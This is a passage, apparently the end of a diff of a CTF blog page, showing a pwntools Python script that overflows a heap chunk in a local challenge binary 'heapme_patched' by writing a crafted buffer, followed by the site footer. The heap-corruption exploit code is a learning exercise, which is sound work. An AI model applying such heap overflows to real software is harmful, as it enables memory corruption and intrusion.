+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%x</span><span class=s2> &#34;</span> <span class=o>%</span> <span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>))),</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#print(len(a))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./heapme_patched&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>createdisk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>createdisk</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># to jump AAAA</span>
+</span></span><span class=line><span class=cl><span class=c1>#buffer=&#39;a&#39;*23</span>
+</span></span><span class=line><span class=cl><span class=c1>#buffer+=chr(0x21)</span>
+</span></span><span class=line><span class=cl><span class=c1>#buffer+=&#39;\0&#39;*8</span>
+</span></span><span class=line><span class=cl><span class=c1>#buffer+=&#39;a&#39;*5</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>buffer</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>23</span>
+</span></span><span class=line><span class=cl><span class=n>buffer</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>buffer</span><span class=o>+=</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>9</span>
+</span></span><span class=line><span class=cl><span class=n>writedisk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buffer</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>readdisk</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>readdisk</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
